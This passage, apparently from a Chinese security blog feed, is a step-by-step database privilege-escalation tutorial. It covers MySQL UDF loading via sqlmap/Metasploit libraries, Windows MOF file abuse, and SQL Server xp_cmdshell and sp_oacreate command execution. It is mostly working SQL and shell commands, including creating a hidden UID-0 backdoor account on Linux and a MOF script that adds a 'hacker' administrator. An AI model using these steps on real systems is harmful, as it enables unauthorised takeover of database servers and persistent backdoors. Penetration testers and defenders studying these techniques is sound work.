cpp"><span class="hljs-function"><span class="hljs-type">char</span> *<span class="hljs-title">xxx</span><span class="hljs-params">(UDF_INIT *initid, UDF_ARGS *args, <span class="hljs-type">char</span> *result, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *length, <span class="hljs-type">char</span> *is_null, <span class="hljs-type">char</span> *error)</span></span>;<br></code></pre></td></tr></table></figure><p>返回值是INTEGER类型</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">long</span> <span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">xxx</span><span class="hljs-params">(UDF_INIT *initid, UDF_ARGS *args, <span class="hljs-keyword">char</span> *is_null, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">error</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>返回值是REAL类型</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">xxx</span><span class="hljs-params">(UDF_INIT *initid, UDF_ARGS *args, <span class="hljs-keyword">char</span> *is_null, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">error</span>)</span></span>;<br></code></pre></td></tr></table></figure><h4 id="系统内置函数"><a href="#系统内置函数" class="headerlink" title="系统内置函数"></a>系统内置函数</h4><p>在完成了用户定义的主函数以后, 还需要编写配套的系统内置函数</p><h5 id="xxx-init函数"><a href="#xxx-init函数" class="headerlink" title="xxx_init函数"></a>xxx_init函数</h5><p>这个函数会在自定义的xxx函数调用前被调用, 进行基本的初始化工作, 其完整定义如下，该函数的主要功能一般是分配空间, 函数参数检查的等. 如果不需要做任何操作, 直接返回0即可.</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">my_bool xxx<span class="hljs-constructor">_init(UDF_INIT <span class="hljs-operator">*</span><span class="hljs-params">initid</span>, UDF_ARGS <span class="hljs-operator">*</span><span class="hljs-params">args</span>, <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">message</span>)</span><br></code></pre></td></tr></table></figure><p>返回值: 1代表出错, 可以在message中给出错误信息并且返回给客户端, 0表示正确执行</p><h5 id="xxx-deinit"><a href="#xxx-deinit" class="headerlink" title="xxx_deinit"></a>xxx_deinit</h5><p>该函数用于释放申请的空间, 其完整定义如下，该函数的功能主要是释放资源, 如果在xxx_init中申请了内存, 可以在此处释放, 该函数在用户函数xxx执行以后执行</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">xxx_deinit</span><span class="hljs-params">(UDF_INIT *initid)</span></span>;<br></code></pre></td></tr></table></figure><h5 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h5><p>调用xxx_init来初始化, 并申请内存空间用于存储结果</p><p>调用xxx</p><p>调用xxx_deinit释放空间</p><h3 id="运行自己的UDF"><a href="#运行自己的UDF" class="headerlink" title="运行自己的UDF"></a>运行自己的UDF</h3><h4 id="编写C-C-代码"><a href="#编写C-C-代码" class="headerlink" title="编写C&#x2F;C++代码"></a>编写C&#x2F;C++代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mysql.h&gt;</span></span><br> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title function_">testadd</span><span class="hljs-params">(UDF_INIT *initid, UDF_ARGS *args, <span class="hljs-type">char</span> *is_null, <span class="hljs-type">char</span> *error)</span><br>&#123;<br><span class="hljs-type">int</span> a = *((<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)args-&gt;args[<span class="hljs-number">0</span>]);<br><span class="hljs-type">int</span> b = *((<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)args-&gt;args[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> my_bool <span class="hljs-title function_">testadd_init</span><span class="hljs-params">(UDF_INIT *initid, UDF_ARGS *args, <span class="hljs-type">char</span> *message)</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="生成动态链接库"><a href="#生成动态链接库" class="headerlink" title="生成动态链接库"></a>生成动态链接库</h4><p>动态链接提供了一种方法，使进程可以调用不属于其可执行代码的函数。函数的可执行代码位于一个 DLL 文件中，该 DLL 包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。DLL 还有助于共享数据和资源。多个应用程序可同时访问内存中单个 DLL 副本的内容。windows是dll文件，linux是so文件</p><p>windows使用</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">使用<span class="hljs-built_in">vs</span>创建dll文件即可<br></code></pre></td></tr></table></figure><p>linux</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">g++ -shared -fPIC -I <span class="hljs-regexp">/usr/i</span>nclude/mysql -o udf.so udf.cpp<br></code></pre></td></tr></table></figure><h4 id="上传到目标机器"><a href="#上传到目标机器" class="headerlink" title="上传到目标机器"></a>上传到目标机器</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、mysql&lt;<span class="hljs-number">5</span>.<span class="hljs-number">0</span>,路径随意<br><span class="hljs-attribute">3</span>、<span class="hljs-number">5</span>.<span class="hljs-number">0</span>&lt;=MYsql&lt;<span class="hljs-number">5</span>.<span class="hljs-number">1</span>， 放置系统目录（system32）<br><span class="hljs-attribute">2</span>、mysql&gt;<span class="hljs-number">5</span>.<span class="hljs-number">1</span>，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，(lib\plugin目录默认不存在，需自行创建)<br></code></pre></td></tr></table></figure><h4 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h4><p>函数名字必须和源码中一样</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> 函数名 returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&quot;udf.dll&quot;</span>;<br></code></pre></td></tr></table></figure><p>查询是否导入成功</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> * from mysql.<span class="hljs-keyword">func</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">select 函数名（参数）<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="提权准备和条件"><a href="#提权准备和条件" class="headerlink" title="提权准备和条件"></a>提权准备和条件</h3><p>1.连接mysql</p><p>连接mysql的方式很多，比如拿到了webshell，或者通过暴力破解的方式，udf提权第一步就是先连接mysql</p><p>2.查询运行权限</p><p>为什么要查询运行权限呢？因为我们udf本质上不是提权，是通过当前mysql的运行权限去执行系统命令，如果mysql运行权限太低的话就无法执行。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">users</span>()</span>; 错误的，这是登录mysql的账号用户<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108201616325.png" alt="image-20240108201616325"> </p><p>**tip:**在linux下5.7之后的版本，默认运行mysql的是mysql用户</p><p>3.查询软件版本</p><p>为什么要查询版本呢？因为不同版本的动态链接文件导入的地方不同</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">version</span>()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108201713331.png" alt="image-20240108201713331"> </p><p>4.查询系统位数</p><p>为什么要查询系统位数呢？不同的系统和位数有不同的动态连接文件</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%compile%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108201742339.png" alt="image-20240108201742339"> </p><p>5.查询读写权限</p><p>为什么要查询读写权限呢？因为我们要将动态连接文件导入到相应的目录里</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限，一般三种情况</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">show global variables like <span class="hljs-string">&#x27;secure%&#x27;</span>;  查询<br>secure_file_priv 的值为 <span class="hljs-keyword">NULL</span> ，表示限制 mysqld 不允许导入|导出，此时无法提权<br>secure_file_priv 的值为 <span class="hljs-regexp">/tmp/</span> ，表示限制 mysqld 的导入|导出只能发生在 <span class="hljs-regexp">/tmp/</span> 目录下，此时也无法提权<br>secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权<br></code></pre></td></tr></table></figure><p>如果想要更改就要改my.cnf文件中配置 <code>secure_file_priv=&#39;&#39;</code></p><p><img src="/img/image-20240108201950378.png" alt="image-20240108201950378"> </p><p>6.查看plugin目录位置</p><p>为什么要查询plugin？<strong>因为我们要将动态连接文件导入到此目录</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;plugin%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108202009540.png" alt="image-20240108202009540"> </p><p>7.生成动态连接文件</p><p>不用我们生成了，在sqlmap中已经存在，或者msf中也存在，我们只需要用就行了，不需要在去写源代码。</p><p>存在位置为，其中分为windows 和linux 版本 分别有32位和64位</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sqlmap<span class="hljs-regexp">/data/u</span>df/mysql<br>metasploit-framework<span class="hljs-regexp">/data/</span>exploits<span class="hljs-regexp">/mysql/</span><br></code></pre></td></tr></table></figure><p><strong>sqlmap</strong></p><p><img src="/img/image-20240108202336253.png" alt="image-20240108202336253"> </p><p>sqlmap中的是通过加密的，需要用解密脚本解密，解密脚本在 <code>/sqlmap/extra/cloak/cloak.py</code></p><p>用法如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python cloak<span class="hljs-selector-class">.py</span> -d -<span class="hljs-selector-tag">i</span> lib_mysqludf_sys<span class="hljs-selector-class">.so_</span>(sqlmap中的加密动态连接文件)<br></code></pre></td></tr></table></figure><p><strong>MSF</strong></p><p><img src="/img/image-20240108202426423.png" alt="image-20240108202426423"></p><h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>1.建表</p><p>创建一张临时表用来存放DLL&#x2F;OS文件的16进制内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> temp_udf (udf <span class="hljs-type">blob</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108202645055.png" alt="image-20240108202645055"> </p><p>2.插入</p><p>其中 binaryCode为已经转换好的十六进制内容,<strong>binaryCode前加0X</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">into</span> temp_udf <span class="hljs-keyword">values</span> (<span class="hljs-keyword">CONVERT</span>($binaryCode,<span class="hljs-type">CHAR</span>));<br></code></pre></td></tr></table></figure><p>转化成16进制方法很多，借助mysql</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> <span class="hljs-built_in">hex</span>(load_file(<span class="hljs-string">&#x27;C:/udf.dll&#x27;</span>)) into dumpfile <span class="hljs-string">&#x27;c:/udf.txt&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108202754030.png" alt="image-20240108202754030"> </p><p>3.导出</p><p>选择对应的地方进行导出</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> udf <span class="hljs-keyword">FROM</span> temp_udf <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&quot;/usr/lib64/mysql/plugin/udf.os&quot;</span><br></code></pre></td></tr></table></figure><p>4.创建函数</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;udf.os&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108202846570.png" alt="image-20240108202846570"> </p><p>5.执行</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&quot;whoami&quot;</span></span>)</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108202902885.png" alt="image-20240108202902885"> </p><p>6.创建后门</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">select sys_eval(<span class="hljs-string">&quot;useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240108202933007.png" alt="image-20240108202933007"></p><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><h3 id="MOF介绍"><a href="#MOF介绍" class="headerlink" title="MOF介绍"></a>MOF介绍</h3><p>mof是<strong>windows系统</strong>的一个“托管对象格式”文件（位置：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;），其<strong>作用是每隔五秒就会去监控进程创建和死亡</strong>，mof目录下有两个文件夹（good与bad）。</p><p><strong>windows server 2003及以下</strong>系统每5秒会执行一次mof目录下的文件，执行成功会移动到good文件夹，执行失败移动到bad文件夹。</p><p><img src="/img/image-20240108203652309.png" alt="image-20240108203652309"> </p><h3 id="MOF提权原理"><a href="#MOF提权原理" class="headerlink" title="MOF提权原理"></a>MOF提权原理</h3><p><strong>mof提权其实就是利用mysql 写入mof文件，通过mof文件中的vbs脚本以system权限执行系统命令</strong></p><p>使用条件如下：</p><p>1、mysql是高权限运行</p><p>2、mysql需要具有导入导出功能</p><p>3、只能用于2003以下的系统（2003以上的系统不在使用该目录）</p><p>提权脚本如下：执行一段vbs语言，执行系统命令</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs swift">#pragma namespace(<span class="hljs-string">&quot;<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>.<span class="hljs-subst">\\</span>root<span class="hljs-subst">\\</span>subscription&quot;</span>)instance of __EventFilter <span class="hljs-keyword">as</span> <span class="hljs-variable">$EventFilter</span><br>&#123;<br><span class="hljs-type">EventNamespace</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Root<span class="hljs-subst">\\</span>Cimv2&quot;</span>;<br><span class="hljs-type">Name</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filtP2&quot;</span>;<br><span class="hljs-type">Query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="hljs-string">&quot;Where TargetInstance Isa <span class="hljs-subst">\&quot;</span>Win32_LocalTime<span class="hljs-subst">\&quot;</span> &quot;</span><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br><span class="hljs-type">QueryLanguage</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;WQL&quot;</span>;<br>&#125;;instance of <span class="hljs-type">ActiveScriptEventConsumer</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$Consumer</span><br>&#123;<br><span class="hljs-type">Name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br><span class="hljs-type">ScriptingEngine</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;JScript&quot;</span>;<br><span class="hljs-type">ScriptText</span> <span class="hljs-operator">=</span><br><span class="hljs-string">&quot;var WSH = new ActiveXObject(<span class="hljs-subst">\&quot;</span>WScript.Shell<span class="hljs-subst">\&quot;</span>)<span class="hljs-subst">\n</span>WSH.run(<span class="hljs-subst">\&quot;</span>net.exe user hacker P@ssw0rd /add<span class="hljs-subst">\&quot;</span>)<span class="hljs-subst">\n</span>WSH.run(<span class="hljs-subst">\&quot;</span>net.exe localgroup administrators hacker /add<span class="hljs-subst">\&quot;</span>)&quot;</span>;<br>&#125;;instance of __FilterToConsumerBinding<br>&#123;<br><span class="hljs-type">Consumer</span>   <span class="hljs-operator">=</span> <span class="hljs-variable">$Consumer</span>;<br><span class="hljs-type">Filter</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$EventFilter</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="MOF提权步骤"><a href="#MOF提权步骤" class="headerlink" title="MOF提权步骤"></a>MOF提权步骤</h3><p>和UDF提权一样，将文件转成二进制然后利用导出函数，导出到对应的目录，然后等待提权即可</p><p>1.创建一个表格</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> temp_mof (mof <span class="hljs-type">blob</span>);<br></code></pre></td></tr></table></figure><p>2.将二进制数据插入到表格中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">into</span> temp_udf <span class="hljs-keyword">values</span> (<span class="hljs-keyword">CONVERT</span>($binaryCode,<span class="hljs-type">CHAR</span>));<br></code></pre></td></tr></table></figure><p>如何将我们的文件导出成二进制问价呢？</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> <span class="hljs-built_in">hex</span>(load_file(<span class="hljs-string">&#x27;C:/mof.dll&#x27;</span>)) into dumpfile <span class="hljs-string">&#x27;c:/mof.txt&#x27;</span><br></code></pre></td></tr></table></figure><p>3.导出到目标目录下</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> udf <span class="hljs-keyword">FROM</span> temp_udf <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&quot;c:/windows/system32/wbem/mof/wanli.mof&quot;</span><br></code></pre></td></tr></table></figure><p>4.等待片刻后提权成功</p><h2 id="sqlServer提权"><a href="#sqlServer提权" class="headerlink" title="sqlServer提权"></a>sqlServer提权</h2><h3 id="SQL-Server介绍"><a href="#SQL-Server介绍" class="headerlink" title="SQL Server介绍"></a>SQL Server介绍</h3><p>SQL Server 是Microsoft 公司推出的关系型数据库管理系统。具有使用方便可伸缩性好与相关软件集成程度高等优点，可跨越从运行Microsoft Windows 98 的膝上型电脑到运行Microsoft Windows 2012 的大型多处理器的服务器等多种平台使用。</p><h3 id="SQL-Server安装"><a href="#SQL-Server安装" class="headerlink" title="SQL Server安装"></a>SQL Server安装</h3><p>1、sqlserver需要 framework支持先安装这个</p><p><img src="/img/image-20231215201636062.png" alt="image-20231215201636062"></p><p>2、选择sqlserver的安装包进行安装</p><p><img src="/img/image-20231215201657438.png" alt="image-20231215201657438"></p><p><img src="/img/image-20231215201714468.png" alt="image-20231215201714468"></p><p>3、运行iso文件弹出安装界面，选择安装全新的sqlserver</p><p><img src="/img/image-20231215201729881.png" alt="image-20231215201729881"></p><p>4、一直点击下一步行安装，全部勾选选择安装</p><p><img src="/img/image-20231215201800951.png" alt="image-20231215201800951"></p><p>4、选择服务启动类型和账户名</p><p><img src="/img/image-20231215201833276.png" alt="image-20231215201833276"></p><p>5、添加sa账户的密码和执行管理员</p><p><img src="/img/image-20231215201847237.png" alt="image-20231215201847237"></p><p>6、一直点击下一步知道安装页面</p><p><img src="/img/image-20231215201903410.png" alt="image-20231215201903410"></p><p>8、完成后如下</p><h3 id="xp-cmdshell提权（前提：sqlserver登录的权限比较高）"><a href="#xp-cmdshell提权（前提：sqlserver登录的权限比较高）" class="headerlink" title="xp_cmdshell提权（前提：sqlserver登录的权限比较高）"></a>xp_cmdshell提权（前提：sqlserver登录的权限比较高）</h3><p>xp_cmdshell可以执行系统命令，该组件默认是关闭的，因此需要把它打开。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。</p><p>1、获取xp_cmdshell的状态如果为1就是有该组件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype=<span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231215203048487.png" alt="image-20231215203048487"></p><p>2、开启xp_cmdshell组件</p><p>开启：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<br></code></pre></td></tr></table></figure><p>关闭：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">0</span>;RECONFIGURE;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231215203131194.png" alt="image-20231215203131194"></p><p>3、执行命令</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">exec</span></span> master..xp_cmdshell <span class="hljs-string">&#x27;ipconfig&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231215203203119.png" alt="image-20231215203203119"></p><h3 id="sp-oacreate-sp-oamethod（dba权限）"><a href="#sp-oacreate-sp-oamethod（dba权限）" class="headerlink" title="sp_oacreate+sp_oamethod（dba权限）"></a>sp_oacreate+sp_oamethod（dba权限）</h3><p>在xp_cmdshell被删除或不能利用是可以考虑利用sp_oacreate，利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql）。sp_oacreate 是一个存储过程，可以删除、复制、移动文件。还能配合 sp_oamethod 来写文件执行系统命令</p><p>1、判断sp_oacreate是否存在，返回1证明存在sp_oacreate</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype=<span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;SP_OACREATE&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231215203246279.png" alt="image-20231215203246279"></p><p>2、开启相关的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,1;reconfigure; <br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;ole automation procedures&#x27;</span>,1;reconfigure;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231215203307253.png" alt="image-20231215203307253"></p><p>3、直接执行命令成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@exec</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@text</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@str</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>) <br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-variable">@exec</span> output,<span class="hljs-string">&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span> <br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@exec</span>, <span class="hljs-string">&#x27;StdOut&#x27;</span>, <span class="hljs-variable">@text</span> <span class="hljs-keyword">out</span> <br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@text</span>, <span class="hljs-string">&#x27;readall&#x27;</span>, <span class="hljs-variable">@str</span> <span class="hljs-keyword">out</span> <br><span class="hljs-keyword">select</span> <span class="hljs-variable">@str</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231215203439581.png" alt="image-20231215203439581"></p>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>src漏洞挖掘思维导图</title>
    <link href="/2023/12/10/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <url>/2023/12/10/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/image-20231210134916137.png" alt="image-20231210134916137"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ICMP和DNS隧道</title>
    <link href="/2023/11/27/ICMP%E5%92%8CDNS%E9%9A%A7%E9%81%93/"/>
    <url>/2023/11/27/ICMP%E5%92%8CDNS%E9%9A%A7%E9%81%93/</url>
    
